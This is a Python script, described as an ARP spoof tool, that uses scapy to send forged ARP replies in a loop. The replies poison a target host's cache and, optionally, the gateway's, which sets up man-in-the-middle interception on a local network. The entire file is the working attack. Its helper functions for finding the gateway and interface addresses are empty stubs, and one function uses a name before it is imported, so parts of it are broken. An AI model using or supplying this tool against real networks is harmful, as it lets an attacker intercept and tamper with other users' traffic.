#!/usr/bin/env python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from argparse import ArgumentParser

def printInterfaces():
    for iface in ifaces.keys():
        print(iface)

def getGatewayMac():
    pass
    
def getGatewayIP():
    pass
    
def getIfaceMAC():
    pass
        
def main():
    parser = ArgumentParser(description="just another ARP spoof tool")
    parser.add_argument('-p', '--impersonateIP', default=getGatewayIP(), help='IP to impersonate')
    parser.add_argument('-i', dest='interface', help='specify interface to MAC spoof on')
    parser.add_argument('-s', dest='sourceMAC', default=getIfaceMAC(), help='source MAC of attacker (default = interfaceMAC)')
    parser.add_argument('-d', dest='delay', type=float, default=1.0, help='delay in seconds between packets broadcasted (default = 2 seconds)')
    parser.add_argument('--gw',dest='spoof_gw', action='store_true', default=False, help='spoof local gateway as well (default = false)')
    parser.add_argument('targetIP', help='IP of target to attack')
    
    parsed_args = parser.parse_args()
    
    targetIP        = parsed_args.targetIP
    interface       = parsed_args.interface
    impersonateIP   = parsed_args.impersonateIP
    sourceMAC       = parsed_args.sourceMAC
    delay           = parsed_args.delay
    spoof_gw        = parsed_args.spoof_gw
    
    for manadatory_option in (targetIP, interface):
        if manadatory_option == None:
            print(parser.usage)
            print("available iterfaces:")
            printInterfaces()
            exit(0)
    
    from scapy.all import sendp, ifaces, Ether, ARP
    
    target_arp_spoof_pkt = Ether() / ARP(op='is_at', hwsrc=sourceMAC, psrc=impersonateIP, pdst=targetIP)
    spoof_pkts = [target_arp_spoof_pkt]
    
    if spoof_gw == True:
        gw_arp_spoof_pkt = Ether() / ARP(op='is_at', hwsrc=sourceMAC, psrc=targetIP, pdst=getGatewayIP())
        spoof_pkts.append(gw_arp_spoof_pkt)
        # divide by 2 to accommodate sending a packet to target and a separate packet to gateway
        delay /= 2
    
    try:
        sendp(spoof_pkts, inter=delay, loop=True)
    except (KeyboardInterrupt, SystemExit):
        exit(0)
    
   
if __name__ == "__main__":
    main()
